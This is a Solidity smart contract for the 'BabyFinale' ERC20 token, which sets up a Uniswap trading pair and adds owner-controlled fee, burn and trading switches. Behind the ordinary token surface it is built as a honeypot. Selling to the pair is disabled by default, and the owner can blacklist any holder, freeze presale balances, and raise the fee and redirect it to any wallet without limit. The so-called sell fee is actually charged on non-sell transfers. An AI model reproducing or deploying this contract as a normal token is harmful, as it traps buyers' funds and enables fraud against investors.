// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*

 ▄▄▄▄    ▄▄▄       ▄▄▄▄ ▓██   ██▓              
▓█████▄ ▒████▄    ▓█████▄▒██  ██▒              
▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██ ██░              
▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░              
░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░              
░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒               
▒░▒   ░   ▒   ▒▒ ░▒░▒   ░▓██ ░▒░               
 ░    ░   ░   ▒    ░    ░▒ ▒ ░░                
 ░            ░  ░ ░     ░ ░                   
  █████▒██▓ ███▄    █  ▄▄▄ ░     ██▓    ▓█████ 
▓██   ▒▓██▒ ██ ▀█   █ ▒████▄    ▓██▒    ▓█   ▀ 
▒████ ░▒██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░    ▒███   
░▓█▒  ░░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░    ▒▓█  ▄ 
░▒█░   ░██░▒██░   ▓██░ ▓█   ▓██▒░██████▒░▒████▒
 ▒ ░   ░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░
 ░      ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░
 ░ ░    ▒ ░   ░   ░ ░   ░   ▒     ░ ░      ░   
        ░           ░       ░  ░    ░  ░   ░  ░

*/

// Importing the interfaces for the ERC20 token and Ownable function
import "./ERC20.sol";
import "./Ownable.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

// Defining the contract Finale, which is a type of ERC20 token and has Ownable properties
contract BabyFinale is ERC20, Ownable {
   
    address public pair;
    uint256 public maxHoldingAmount;
    bool public tradingOn = true;
    bool public sellingOn = false;
    bool public limitOn = false;
    bool public transferTaxOn = true;

    address public feeWallet = 0x07Ab7a81aA12C84Bf81f0B6fcF324164FfD12392;
    uint256 public sellFee = 2;
    uint256 public burnFee = 2;

    mapping(address => bool) public blacklist;

    address public requiredToken = 0xC7a2572fA8FDB0f7E81d6D3c4e3CCF78FB0DC374;
    uint256 public requiredTokenAmount;
    bool public requiredTokenRuleOn = false;
    
    mapping(address => uint256) public presaleBalancesStore;
    bool public presaleHolderLock = true;
   
    constructor() ERC20("Baby Finale", "BABYFI") {
        uint256 _totalSupply = 55000000000000000000000000000;
        uint256 remainingSupply = _totalSupply;
        _mint(msg.sender, remainingSupply);

        maxHoldingAmount = _totalSupply / 100;
        requiredTokenAmount = (55 * 10**9 * 10**18) / 5000;

       
        address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
       
        pair = IUniswapV2Factory(IUniswapV2Router02(ROUTER).factory()).createPair(WETH, address(this));
    }

   
    function setBlacklist(address _address, bool _isBlacklisted) external onlyOwner {
        blacklist[_address] = _isBlacklisted;
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function setBools(
        bool _tradingOn,
        bool _sellingOn,
        bool _limitOn,
        bool _transferTaxOn,
        bool _requiredTokenRuleOn
    ) external onlyOwner {
        tradingOn = _tradingOn;
        sellingOn = _sellingOn;
        limitOn = _limitOn;
        transferTaxOn = _transferTaxOn;
        requiredTokenRuleOn = _requiredTokenRuleOn;
    }

    function setAmmounts(
        uint256 _maxHoldingAmount,
        uint256 _requiredTokenAmount
    ) external onlyOwner {
        maxHoldingAmount = _maxHoldingAmount;
        requiredTokenAmount = _requiredTokenAmount;
    }

    function setFee(
        uint256 _sellFee,
        address _feeWallet
    ) external onlyOwner {
        sellFee = _sellFee;
        feeWallet = _feeWallet;
    }

    function requiredTokenAddress(
        address _requiredToken
    ) external onlyOwner {
        requiredToken = _requiredToken;
    }

    function setBurn(
        uint256 _burnFee
    ) external onlyOwner {
        burnFee = _burnFee;
    }

   
    function setPresaleHolderLock(bool _presaleHolderLock) external onlyOwner {
        presaleHolderLock = _presaleHolderLock;
    }

   
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
       
        require(!blacklist[to] && !blacklist[from], "Blacklisted");
       
        if (!tradingOn) {
            require(from == owner() || to == owner(), "Trading not enabled");
        } else {
           
            require(sellingOn || to != pair, "Selling not enabled");

           
            if (limitOn && from == pair) {
                require(
                    super.balanceOf(to) + amount <= maxHoldingAmount,
                    "Max holding amount exceeded"
                );
            }

           
            if (requiredTokenRuleOn && to == pair) {
                require(
                    IERC20(requiredToken).balanceOf(from) >= requiredTokenAmount, "Insufficient Finale balance in wallet to sell."
                );
            }

           
            if (presaleHolderLock && presaleBalancesStore[from] > 0) {
                require(
                    super.balanceOf(from) - amount >= presaleBalancesStore[from],
                    "Presale tokens are currently frozen."
                );
            }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        if (transferTaxOn && recipient != pair) {
            uint256 feeAmount = (amount * sellFee) / 100;
            uint256 burnAmount = (amount * burnFee) / 100;

            uint256 amountAfterFee = amount - feeAmount;
            uint256 amountAfterBurn = amountAfterFee - burnAmount;

            super._transfer(sender, feeWallet, feeAmount);
            _burn(sender, burnAmount);

            super._transfer(sender, recipient, amountAfterBurn);
        } else {
            super._transfer(sender, recipient, amount);
        }
    }
}
